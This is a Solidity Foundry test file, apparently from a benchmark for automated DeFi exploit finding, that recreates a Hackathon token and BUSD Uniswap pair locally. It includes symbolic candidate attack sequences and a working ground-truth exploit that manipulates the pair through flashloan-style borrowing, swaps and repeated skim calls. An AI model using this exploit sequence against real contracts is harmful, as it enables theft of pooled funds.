// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BUSD} from "@utils/BUSD.sol";
import {Hackathon} from "./Hackathon.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract HackathonTest is Test, BlockLoader {
    BUSD busd;
    Hackathon hackathon;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address busdAddr;
    address hackathonAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1713102233;
    uint112 reserve0pair = 20977616272338421765527051;
    uint112 reserve1pair = 21022463771179001068726;
    uint32 blockTimestampLastpair = 1713099253;
    uint256 kLastpair = 441000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint256 totalSupplybusd = 3679997893719565019732285863;
    uint256 balanceOfbusdpair = 21022463771179001068726;
    uint256 balanceOfbusdattacker = 0;
    uint256 totalSupplyhackathon = 21000000000000000000000000;
    uint256 balanceOfhackathonpair = 20977616272338421765527051;
    uint256 balanceOfhackathonattacker = 0;

    function setUp() public {
        owner = address(this);
        busd = new BUSD();
        busdAddr = address(busd);
        hackathon = new Hackathon();
        hackathonAddr = address(hackathon);
        pair = new UniswapV2Pair(
            address(hackathon),
            address(busd),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        busd.transfer(address(pair), balanceOfbusdpair);
        hackathon.transfer(address(pair), balanceOfhackathonpair);
        uint256[] memory feeList = new uint256[](3);
        feeList[0] = 500;
        feeList[1] = 500;
        feeList[2] = 0;
        hackathon.prepare(address(pair), true, feeList);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Busd Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(busd),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(busd),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("Hackathon Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(hackathon),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(hackathon),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(pair),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(pair),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(busd),
            address(attacker),
            busd.decimals()
        );
        queryERC20BalanceDecimals(
            address(hackathon),
            address(attacker),
            hackathon.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e12 + balanceOfbusdattacker;
    }

    function borrow_busd_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_busd_owner(uint256 amount) internal eurus {
        busd.transfer(owner, amount);
    }

    function borrow_hackathon_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        hackathon.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_hackathon_owner(uint256 amount) internal eurus {
        hackathon.transfer(owner, amount);
    }

    function swap_pair_attacker_hackathon_busd(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        hackathon.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_busd_hackathon(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        busd.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_hackathon_pair(uint256 amount) internal eurus {
        hackathon.transfer(address(pair), amount);
        uint256 i = 0;
        while (i < 10) {
            pair.skim(address(pair));
            pair.skim(address(attacker));
            i++;
        }
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        swap_pair_attacker_hackathon_busd(amt3, amt4);
        payback_busd_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        burn_hackathon_pair(amt1);
        swap_pair_attacker_busd_hackathon(amt2, amt3);
        swap_pair_attacker_hackathon_busd(amt4, amt5);
        payback_busd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        burn_hackathon_pair(amt3);
        swap_pair_attacker_hackathon_busd(amt4, amt5);
        payback_busd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_hackathon_owner(amt0);
        swap_pair_attacker_hackathon_busd(amt1, amt2);
        swap_pair_attacker_busd_hackathon(amt3, amt4);
        payback_hackathon_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_hackathon_owner(amt0);
        burn_hackathon_pair(amt1);
        swap_pair_attacker_hackathon_busd(amt2, amt3);
        swap_pair_attacker_busd_hackathon(amt4, amt5);
        payback_hackathon_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_hackathon_owner(amt0);
        swap_pair_attacker_hackathon_busd(amt1, amt2);
        burn_hackathon_pair(amt3);
        swap_pair_attacker_busd_hackathon(amt4, amt5);
        payback_hackathon_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        swap_pair_attacker_hackathon_busd(amt3, amt4);
        swap_pair_attacker_busd_hackathon(amt5, amt6);
        swap_pair_attacker_hackathon_busd(amt7, amt8);
        payback_busd_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        burn_hackathon_pair(amt1);
        swap_pair_attacker_busd_hackathon(amt2, amt3);
        swap_pair_attacker_hackathon_busd(amt4, amt5);
        swap_pair_attacker_busd_hackathon(amt6, amt7);
        swap_pair_attacker_hackathon_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        burn_hackathon_pair(amt3);
        swap_pair_attacker_hackathon_busd(amt4, amt5);
        swap_pair_attacker_busd_hackathon(amt6, amt7);
        swap_pair_attacker_hackathon_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        swap_pair_attacker_hackathon_busd(amt3, amt4);
        burn_hackathon_pair(amt5);
        swap_pair_attacker_busd_hackathon(amt6, amt7);
        swap_pair_attacker_hackathon_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        swap_pair_attacker_hackathon_busd(amt3, amt4);
        swap_pair_attacker_busd_hackathon(amt5, amt6);
        burn_hackathon_pair(amt7);
        swap_pair_attacker_hackathon_busd(amt8, amt9);
        payback_busd_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_hackathon_owner(amt0);
        swap_pair_attacker_hackathon_busd(amt1, amt2);
        swap_pair_attacker_busd_hackathon(amt3, amt4);
        swap_pair_attacker_hackathon_busd(amt5, amt6);
        swap_pair_attacker_busd_hackathon(amt7, amt8);
        payback_hackathon_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hackathon_owner(amt0);
        burn_hackathon_pair(amt1);
        swap_pair_attacker_hackathon_busd(amt2, amt3);
        swap_pair_attacker_busd_hackathon(amt4, amt5);
        swap_pair_attacker_hackathon_busd(amt6, amt7);
        swap_pair_attacker_busd_hackathon(amt8, amt9);
        payback_hackathon_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hackathon_owner(amt0);
        swap_pair_attacker_hackathon_busd(amt1, amt2);
        burn_hackathon_pair(amt3);
        swap_pair_attacker_busd_hackathon(amt4, amt5);
        swap_pair_attacker_hackathon_busd(amt6, amt7);
        swap_pair_attacker_busd_hackathon(amt8, amt9);
        payback_hackathon_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hackathon_owner(amt0);
        swap_pair_attacker_hackathon_busd(amt1, amt2);
        swap_pair_attacker_busd_hackathon(amt3, amt4);
        burn_hackathon_pair(amt5);
        swap_pair_attacker_hackathon_busd(amt6, amt7);
        swap_pair_attacker_busd_hackathon(amt8, amt9);
        payback_hackathon_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_hackathon_owner(amt0);
        swap_pair_attacker_hackathon_busd(amt1, amt2);
        swap_pair_attacker_busd_hackathon(amt3, amt4);
        swap_pair_attacker_hackathon_busd(amt5, amt6);
        burn_hackathon_pair(amt7);
        swap_pair_attacker_busd_hackathon(amt8, amt9);
        payback_hackathon_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 2200 * 1e18);
        borrow_busd_owner(2200 * 1e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", busd.balanceOf(attacker));
        emit log_named_uint(
            "amt2",
            pair.getAmountOut(busd.balanceOf(attacker), address(busd))
        );
        swap_pair_attacker_busd_hackathon(
            busd.balanceOf(attacker),
            pair.getAmountOut(busd.balanceOf(attacker), address(busd))
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", hackathon.balanceOf(attacker));
        burn_hackathon_pair(hackathon.balanceOf(attacker));
        printBalance("After step2 ");
        emit log_named_uint("amt4", hackathon.balanceOf(attacker));
        emit log_named_uint(
            "amt5",
            pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))
        );
        swap_pair_attacker_hackathon_busd(
            hackathon.balanceOf(attacker),
            pair.getAmountOut(hackathon.balanceOf(attacker), address(hackathon))
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", (2200 * 1e18 * 1003) / 1000);
        payback_busd_owner((2200 * 1e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_hackathon(amt1, amt2);
        burn_hackathon_pair(amt3);
        swap_pair_attacker_hackathon_busd(amt4, amt5);
        payback_busd_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
